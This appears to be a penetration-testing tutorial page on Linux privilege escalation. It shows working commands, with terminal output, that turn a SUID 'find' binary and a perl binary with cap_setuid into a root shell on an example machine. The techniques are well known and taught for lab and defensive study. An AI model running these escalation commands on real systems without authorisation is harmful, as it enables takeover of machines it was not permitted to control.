---
description: An example of how to leverage an SUID binary into privilege escalation
---

# Abusing SUID Binaries

When not properly secured, **setuid** (**SUID**) **binaries** can lead to attacks that elevate privileges.

## SUID Flag Set

As mentioned in the [enumeration section](../enumeration/manual-enumeration.md), binaries with the SUID bit set can be found with the command:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Sometimes attackers will get lucky and one of these binaries will have an obvious privilege escalation path. Consider the example machine:

```shell-session
joe@debian-privesc:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/find
...
```

Among others, the `find` binary is found to have the SUID flag set. It turns out, the [find](https://www.man7.org/linux/man-pages/man1/find.1.html) utility has the ability to execute commands against found files via the `-exec` flag. This takes a parameter of a command. In this example the command will be calling the bash binary to open a shell session.&#x20;

This will be paired with the [Set Builtin](https://www.gnu.org/software/bash/manual/html\_node/The-Set-Builtin.html) (a builtin tool that allows users to set shell parameters) `-p` parameter which enables "privileged mode." Per the builtin documentation "If the `-p` option is supplied at startup, the effective user id is not reset." In this case that would cause the eUID from `find`, which is `0` (`root`) because it is an SUID binary, to remain as the eUID for the executed command. This will all come together as follows:

```bash
find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
```

* `find` is set to search for a well-known directory `/home/joe/Desktop`
* `-exec` is used to invoke a command
* The command is calling the `bash` binary at `/usr/bin/bash`
  * The `-p` flag enables privileged mode
* `\;` is used to denote the end of the command passed via `-exec`. The semicolon (`;`) is preceded by the backslash (`\`) to protect it from interpretation as shell script punctuation

Running this command on the example machine would result in elevated privileges:

```shell-session
joe@debian-privesc:~$ find /home/joe/Desktop -exec "/usr/bin/bash" -p \;

bash-5.0# id
uid=1000(joe) gid=1000(joe) euid=0(root) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)

bash-5.0# whoami
root
```

Note the eUID is set to 0 as displayed by the `id` command.

This example was quite convenient in that the misconfigured binary (`find`) had an easy path to code execution and privilege escalation (via the `-exec` flag). Attacker's will not always get this lucky but it shows how leveraging misconfigured binaries _could_ lead to privilege escalation.

## cap\_setuid

As discussed in the enumeration section, [capabilities](../enumeration/manual-enumeration.md#linux-capabilities) allow a process to have selectively elevated permissions. One of the capabilities that can be useful in privilege escalation is `cap_setuid`. According to the capabilities [manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html), this allows a process to "make arbitrary manipulations of process UIDs."

To list the available capabilities on the target machine use the command (this can obviously be filtered to just interesting capabilities via `grep`):

```bash
getcap -r / 2>/dev/null
```

* Note on the target the full executable path to `getcap` is used

```shell-session
joe@debian-privesc:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl5.28.1 = cap_setuid+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

The two `perl` binaries are the most interesting here as they have both `cap_setuid` and the `+ep` flag (meaning the capabilities are both effective and permitted, i.e. the process is actually running with this capability active).

The easiest way to find an exploit binary for any particular system is to check [GTFOBins](https://gtfobins.github.io/).

[GTFOBins](https://gtfobins.github.io/) is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems. The project collects legitimate functions of Unix binaries that can be abused to break out of restricted shells. It is not a list of exploits per se, rather it is a compendium about how to live off the land when there are only certain binaries available.

Searching "Perl" on GTFOBins will reveal [this page](https://gtfobins.github.io/gtfobins/perl/#capabilities), which contains the exact command to turn this misconfiguration into elevated privileges:

```bash
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

Executing this command on the target does indeed result in elevated access (on the target `perl` can just be used as a command rather than navigating to its directory and calling it via `./perl`):

```shell-session
joe@debian-privesc:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
perl: warning: Setting locale failed.
...
# id
uid=0(root) gid=1000(joe) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
```
